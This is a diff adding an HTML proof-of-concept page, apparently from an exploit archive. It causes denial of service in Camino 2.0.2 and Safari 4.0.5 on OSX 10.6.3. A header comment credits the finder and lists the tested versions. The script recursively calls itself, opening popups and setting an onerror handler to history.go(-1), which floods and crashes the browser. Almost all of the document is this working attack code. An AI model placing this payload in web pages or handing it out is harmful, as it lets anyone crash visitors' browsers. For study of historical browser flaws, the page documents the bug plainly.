@@ -1,0 +1,22 @@
+<--
+Camino 2.0.2 history.go() DoS
+Found By:   Dr_IDE
+Tested On:  Camino 2.0.2 on OSX 10.6.3
+Notes:      Impact is reduced because user must either have popup blocker off, or accept popups.
+
+Tested On:  Safari 4.0.5 on OSX 10.6.3
+Notes:      Impact is reduced because user must either have popup blocker off, or accept popups.
+-->
+
+<html>
+<title>Dr_IDE - Camino 2.0.2 & Safari 4.0.5 DoS PoC</title>
+<script>
+function test(){
+window.onerror=new Function("history.go(-1)");
+window.open('http://www.exploit-db.com');
+test();
+}
+
+test();
+</script>
+</html>
